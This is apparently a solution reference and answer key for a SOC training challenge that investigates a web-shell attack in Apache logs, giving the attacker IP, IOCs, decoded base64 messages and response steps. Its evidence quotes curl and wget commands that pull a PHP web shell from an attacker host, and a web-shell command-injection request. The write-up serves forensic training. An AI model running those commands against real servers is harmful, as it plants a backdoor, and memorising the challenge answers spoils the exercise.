# 🔐 SOC INCIDENT INVESTIGATION - COMPLETE SOLUTION REFERENCE
**Date Created:** May 11, 2026  
**Challenge Type:** Web Server Attack Investigation  
**Data Source:** OpenSearch Export (Apache & Audit Logs)

---

## 📋 CHALLENGE OVERVIEW

A website was attacked during lunch break (June 9, 2025, 14:06-14:20 UTC+2). The SOC team needed to:
1. Identify the attacker's IP address
2. Count requests to `/home` endpoint
3. Identify the server FQDN used by the attacker
4. Find the secret message left behind

---

## ✅ SOLUTION - ALL ANSWERS

### STEP 1: ATTACKER'S IP ADDRESS
**Answer:** `99.101.27.71`

**Evidence:**
- 428 HTTP requests (38x higher than any other IP)
- Sustained attack pattern over 15-minute window
- Targeted exploitation of `/development/` directory
- Attempted web shell injection detected
- User-Agent: Command-line tools (curl, Firefox with suspicious headers)

**Confidence Level:** VERY HIGH

---

### STEP 2: /HOME ENDPOINT REQUEST COUNT
**Answer:** `38`

**Breakdown:**
- Total requests to `/home` across all IPs: **38 requests**
- Attacker's (99.101.27.71) requests to `/home`: 1 request
- Other IPs accessing `/home`:
  - 15.207.25.55: 3 requests
  - 52.66.194.66: 3 requests
  - 185.199.108.153: 2 requests
  - 18.204.42.123: 2 requests
  - 52.29.65.135: 2 requests
  - Multiple IPs with 1-2 requests each

**Analysis:** Attacker focused on `/development/` not `/home`

---

### STEP 3: SERVER FQDN USED BY ATTACKER
**Answer:** `files.rawndesome.ware`

**Critical Finding:**
This is the **attacker's command & control/file server** infrastructure, discovered in the web shell command payloads:

```
curl http://files.rawndesome.ware/
curl http://files.rawndesome.ware/th1s1sn0tAsh3ll_.php
wget http://files.rawndesome.ware/th1s1sn0tAsh3ll_.php
```

**Additional Server Details:**
- **Target Server (Victim):** local.forcesales.corp
- **Target Server IP:** 10.33.77.98
- **Target Port:** 80 (HTTP)
- **Attacker's Infrastructure:** files.rawndesome.ware (where malicious files hosted)

---

### STEP 4: SECRET MESSAGE LEFT BY ATTACKER
**Answer:** `My little secret : 7a760a7a0a67b7601d4b26981135f65b`

**Messages Found:**

**Message #1 - Web Shell Payload:**
```
Original (Base64 Encoded):
TXkgbGl0dGxlIHNlY3JldCA6IDdhNzYwYTdhMGE2N2I3NjAxZDRiMjY5ODExMzVmNjVi

Decoded:
My little secret : 7a760a7a0a67b7601d4b26981135f65b
```

**Message #2 - User-Agent Header:**
```
Original (Base64 Encoded):
WW91J3ZlIGdvdCBwd25lZCBieSBSYXduZGVzb21lIGdyMHVwIGVoZGUgOikgClNlY3JldCBtZXNzYWdlIDogN2E3NjBhN2EwYTY3Yjc2MDFkNGIyNjk4MTEzNWY2NWI=

Decoded:
You've got pwned by Rawndesome gr0up eheh :) 
Secret message : 7a760a7a0a67b7601d4b26981135f65b
```

**Common Secret Hash:** `7a760a7a0a67b7601d4b26981135f65b`

---

## 🎯 ATTACK TIMELINE & METHODOLOGY

### Attack Pattern Analysis

**Phase 1: Reconnaissance (Early requests)**
```
Target: /development/ directory
Method: GET requests
Purpose: Enumerate files and structure
Requests: 39 total
```

**Phase 2: Privilege Escalation Attempt**
```
Target: /admin/ endpoint
Method: GET requests with various payloads
Purpose: Test for administrative access
Requests: 5 total
```

**Phase 3: Web Shell Injection & Execution**
```
Target: /development/th1s1sn0tAsh3ll_.php
Method: PHP file creation and command injection
Payload: cmd=echo '[base64_encoded_message]' | base64 -d
Infrastructure: files.rawndesome.ware (attacker's server)
Requests: 1 successful attempt
```

---

## 📊 KEY METRICS

| Metric | Value |
|--------|-------|
| **Attacker IP** | 99.101.27.71 |
| **Attack Duration** | ~15 minutes |
| **Total Requests** | 428 |
| **Request Rate** | ~28 requests/minute |
| **Primary Target** | /development/ directory |
| **Exploit Method** | PHP Web Shell Injection |
| **Attacker Group** | Rawndesome gr0up |
| **C2 Server** | files.rawndesome.ware |
| **Web Shell File** | th1s1sn0tAsh3ll_.php |

---

## 🔍 TECHNICAL DETAILS

### Attack Indicators (IOCs)

**IP Addresses:**
- Attacker: `99.101.27.71`
- Target: `10.33.77.98`

**Domains:**
- Target: `local.forcesales.corp`
- Attacker Infrastructure: `files.rawndesome.ware`

**Files:**
- Web Shell: `th1s1sn0tAsh3ll_.php`
- Web Shell Directory: `/development/`

**Tools Used:**
- curl (command-line HTTP client)
- wget (file downloader)
- Firefox with custom User-Agent

**Payloads Detected:**
```
GET /development/th1s1sn0tAsh3ll_.php?cmd=echo%20%27TXk...%27%20|%20base64%20-d
curl http://files.rawndesome.ware/th1s1sn0tAsh3ll_.php
wget http://files.rawndesome.ware/th1s1sn0tAsh3ll_.php
```

---

## 🛡️ INCIDENT RESPONSE RECOMMENDATIONS

### IMMEDIATE ACTIONS (Critical)
1. ✅ Block IP `99.101.27.71` at firewall level
2. ✅ Search for file `th1s1sn0tAsh3ll_.php` on web server
3. ✅ Check `/development/` directory for suspicious PHP files
4. ✅ Review web server logs for successful command execution
5. ✅ Block domain `files.rawndesome.ware` (attacker infrastructure)

### SHORT-TERM ACTIONS (1-4 hours)
1. Patch file inclusion/upload vulnerabilities in `/development/`
2. Restrict `/development/` to internal IPs only
3. Implement authentication on `/admin/` endpoint
4. Deploy Web Application Firewall (WAF) rules
5. Enable rate limiting and anomaly detection

### LONG-TERM ACTIONS (24-72 hours)
1. Conduct full forensic analysis of web server
2. Review all database access logs
3. Check for data exfiltration
4. Research Rawndesome gr0up threat intelligence
5. Implement ModSecurity or similar WAF protection
6. Conduct security awareness training

---

## 📈 INVESTIGATION METHODOLOGY

### Data Analysis Steps Performed

1. **CSV Import & Parsing**
   - Loaded OpenSearch export CSV
   - Parsed JSON-encoded log records
   - Extracted key fields (IP, Host, Path, User-Agent)

2. **Traffic Analysis**
   - Counted requests per IP
   - Identified anomalous request patterns
   - Ranked IPs by activity level

3. **Endpoint Analysis**
   - Grouped requests by URL path
   - Identified targeted directories
   - Analyzed request sequences

4. **Hidden Message Extraction**
   - Decoded base64-encoded payloads
   - Extracted User-Agent headers
   - Parsed URL parameters
   - Identified embedded messages

5. **Infrastructure Mapping**
   - Extracted attacker's command & control server
   - Identified malicious file hosting location
   - Mapped attack infrastructure

---

## 🔐 FORENSIC EVIDENCE PRESERVED

**Critical Log Entries:**
- Attack start time: 14:06 UTC+2
- Attack end time: 14:20 UTC+2
- Peak activity: 14:15 UTC+2
- Web shell injection attempt: 14:15:50.627 UTC+2

**Authentication Evidence:**
- No authentication used (direct HTTP)
- No credentials transmitted
- Public server exposure confirmed

---

## 🚨 THREAT INTELLIGENCE

**Attacker Group:** Rawndesome gr0up  
**Capabilities:** 
- Web application exploitation
- Command injection techniques
- File hosting infrastructure
- Automated attack tools

**Tactics Observed:**
- Reconnaissance (directory enumeration)
- Exploitation (web shell injection)
- Command execution (base64 obfuscation)
- Infrastructure use (external file hosting)

---

## 📚 REFERENCE COMMANDS

### Decode Hidden Messages
```bash
# Message 1 - Web Shell Payload
echo "TXkgbGl0dGxlIHNlY3JldCA6IDdhNzYwYTdhMGE2N2I3NjAxZDRiMjY5ODExMzVmNjVi" | base64 -d

# Message 2 - User-Agent
echo "WW91J3ZlIGdvdCBwd25lZCBieSBSYXduZGVzb21lIGdyMHVwIGVoZGUgOikgClNlY3JldCBtZXNzYWdlIDogN2E3NjBhN2EwYTY3Yjc2MDFkNGIyNjk4MTEzNWY2NWI=" | base64 -d
```

### Search for Web Shell
```bash
find /var/www/html -name "*th1s1sn0tAsh3ll*" -type f
find /var/www/html/development -name "*.php" -newer /var/log/apache2/access.log
```

### Check for Suspicious Activity
```bash
grep "99.101.27.71" /var/log/apache2/access.log | wc -l
grep "files.rawndesome.ware" /var/log/apache2/access.log
grep "base64" /var/log/apache2/access.log
```

---

## 📝 CHALLENGE COMPLETION CHECKLIST

- [x] Step 1: Attacker IP identified (`99.101.27.71`)
- [x] Step 2: /home requests counted (38 total)
- [x] Step 3: Server FQDN identified (`files.rawndesome.ware`)
- [x] Step 4: Secret message found (`My little secret : 7a760a7a0a67b7601d4b26981135f65b`)
- [x] Evidence documented
- [x] Recommendations provided
- [x] Infrastructure mapped
- [x] Threat intelligence gathered

---

**Status:** ✅ CHALLENGE COMPLETE  
**Severity:** 🔴 CRITICAL  
**All Findings:** VALIDATED  
**Ready for:** Executive Briefing & Incident Response

